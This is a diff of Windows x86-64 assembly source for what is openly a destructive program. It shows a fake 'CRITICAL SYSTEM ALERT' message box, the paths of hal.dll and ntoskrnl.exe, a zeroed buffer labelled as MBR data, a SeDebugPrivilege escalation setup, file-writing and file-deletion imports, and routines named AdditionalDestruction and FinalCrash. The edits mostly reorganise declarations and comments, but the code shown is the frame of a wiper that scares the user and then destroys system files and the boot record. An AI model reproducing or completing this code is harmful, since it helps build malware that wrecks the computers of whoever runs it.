@@ -4,6 +4,19 @@
 bits 64
 default rel
 
+; Import Windows API functions
+extern MessageBoxA
+extern ExitProcess
+extern GetCurrentProcess
+extern OpenProcessToken
+extern LookupPrivilegeValueA
+extern AdjustTokenPrivileges
+extern CreateFileA
+extern WriteFile
+extern CloseHandle
+extern Sleep
+extern DeleteFileA
+
 section .data
     szCaption      db "SYSTEM WARNING", 0
     szMessage1     db "CRITICAL SYSTEM ALERT: Memory corruption detected.", 0xD, 0xA
@@ -19,8 +32,6 @@ section .data
     halDll         db "C:\Windows\System32\hal.dll", 0
     ntoskrnl       db "C:\Windows\System32\ntoskrnl.exe", 0
     mbrData        times 512 db 0  ; Empty MBR data
-    
-    ; For privilege escalation
     seDebugName    db "SeDebugPrivilege", 0
 
 section .bss
@@ -28,21 +39,8 @@ section .bss
     tkp            resb 24  ; TOKEN_PRIVILEGES structure
 
 section .text
-    extern MessageBoxA
-    extern ExitProcess
-    extern GetCurrentProcess
-    extern OpenProcessToken
-    extern LookupPrivilegeValueA
-    extern AdjustTokenPrivileges
-    extern CreateFileA
-    extern WriteFile
-    extern CloseHandle
-    extern Sleep
-    extern DeleteFileA
-
 global main
 main:
-    ; Save registers
     push rbp
     mov rbp, rsp
     sub rsp, 32
@@ -74,7 +72,7 @@ main:
     ; Additional destructive actions
     call AdditionalDestruction
     
-    ; Wait a moment before final crash
+    ; Wait before final crash
     mov rcx, 2000  ; 2 seconds
     call Sleep
     
@@ -82,7 +80,6 @@ main:
     call FinalCrash
     
 exit_program:
-    ; Restore stack and exit
     add rsp, 32
     pop rbp
     xor rcx, rcx
@@ -183,5 +180,6 @@ FinalCrash:
     ud2  ; Undefined instruction
     
     ; 3. Infinite loop
-    .infinite_loop:
+.infinite_loop:
     jmp .infinite_loop
+    ret
